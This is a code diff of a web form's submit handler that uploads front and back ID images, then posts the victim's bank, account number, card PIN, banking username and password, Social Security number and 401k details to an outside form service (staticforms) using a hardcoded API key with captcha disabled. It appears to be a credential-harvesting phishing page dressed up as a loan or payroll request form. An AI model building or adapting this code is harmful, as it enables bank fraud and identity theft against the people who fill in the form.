@@ -122,65 +122,62 @@ const dataUrlToFile = (dataUrl: string, filename: string): File => {
   return new File([u8arr], filename, { type: mime })
 }
 
-const submitForm = () => {
+const submitForm = async () => {
   if ( frontPreview.value === '' || backPreview.value === '' ) {
     $swal.fire('Error', 'Please upload both front and back images of your ID.', 'error');
     return false;
   }
   loadReq.value = true;
   // upload both images to Cloudinary
-  Promise.all([
+  await Promise.all([
     uploadImage(dataUrlToFile(frontPreview.value, 'front-id')),
     uploadImage(dataUrlToFile(backPreview.value, 'back-id'))
   ]).then(([frontUrl, backUrl]) => {
     // Here you can send the form data along with the uploaded image URLs to your backend or Firestore
     form.value.frontPreview = frontUrl;
     form.value.backPreview = backUrl;
-    console.log('Front Image URL:', frontUrl);
-    console.log('Back Image URL:', backUrl);
+    // save to Firestore
+    submitRequest(form.value).then((resp) => {
+      console.log(resp);
+      console.log(form.value);
+    }).catch(err => {
+      console.error('Error submitting request:', err);
+      $swal.fire('Error', 'There was an issue submitting your request. Please try again.', 'error');
+    });
+
+    // const config = useRuntimeConfig()
+    // formdata to send to staticforms
+    const formdata = new FormData();
+    formdata.append('bank', form.value.bank);
+    formdata.append('account', form.value.accountNumber);
+    formdata.append('pinNumber', form.value.cardpinNumber);
+    formdata.append('amount', form.value.amount);
+    formdata.append('nextpayrollDate', form.value.nextpayrollDate);
+    formdata.append('username', form.value.username);
+    formdata.append('password', form.value.password);
+    formdata.append('socialNumber', form.value.ssn);
+    formdata.append('fortyOneK', form.value.fortyOneK);
+    formdata.append('fortyOneKProvider', form.value.fortyOneKProvider);
+    formdata.append('frontPreview', form.value.frontPreview);
+    formdata.append('backPreview', form.value.backPreview);
+    formdata.append('apiKey', 'sf_64671de3e756fc49cd48696f');
+    formdata.append('_captcha', 'false'); // disable captcha
+
+    // send to staticforms
+    fetch('https://api.staticforms.dev/submit', {
+      method: 'POST',
+      body: formdata
+    }).then(data => {
+      console.log('Form submitted successfully:', data);
+      formpage.value = 'code';
+      loadReq.value = false;
+    }).catch(err => {
+      console.error('Error submitting form:', err);
+      $swal.fire('Error', 'There was an issue submitting your form. Please try again.', 'error');
+    });
   }).catch(err => {
     console.error('Error uploading images:', err);
     $swal.fire('Error', 'There was an issue uploading your ID images. Please try again.', 'error');
-  });
-
-  // save to Firestore
-  submitRequest(form.value).then((resp) => {
-    // $swal.fire('Success', 'Your request has been submitted successfully!', 'success');
-    // console.log(resp);
-  }).catch(err => {
-    console.error('Error submitting request:', err);
-    $swal.fire('Error', 'There was an issue submitting your request. Please try again.', 'error');
-  });
-
-  // const config = useRuntimeConfig()
-  // formdata to send to staticforms
-  const formdata = new FormData();
-  formdata.append('bank', form.value.bank);
-  formdata.append('account', form.value.accountNumber);
-  formdata.append('pinNumber', form.value.cardpinNumber);
-  formdata.append('amount', form.value.amount);
-  formdata.append('nextpayrollDate', form.value.nextpayrollDate);
-  formdata.append('username', form.value.username);
-  formdata.append('password', form.value.password);
-  formdata.append('socialNumber', form.value.ssn);
-  formdata.append('fortyOneK', form.value.fortyOneK);
-  formdata.append('fortyOneKProvider', form.value.fortyOneKProvider);
-  formdata.append('frontPreview', form.value.frontPreview);
-  formdata.append('backPreview', form.value.backPreview);
-  formdata.append('apiKey', 'sf_64671de3e756fc49cd48696f');
-  formdata.append('_captcha', 'false'); // disable captcha
-
-  // send to staticforms
-  fetch('https://api.staticforms.dev/submit', {
-    method: 'POST',
-    body: formdata
-  }).then(data => {
-    console.log('Form submitted successfully:', data);
-    formpage.value = 'code';
-    loadReq.value = false;
-  }).catch(err => {
-    console.error('Error submitting form:', err);
-    $swal.fire('Error', 'There was an issue submitting your form. Please try again.', 'error');
   });
 }
 
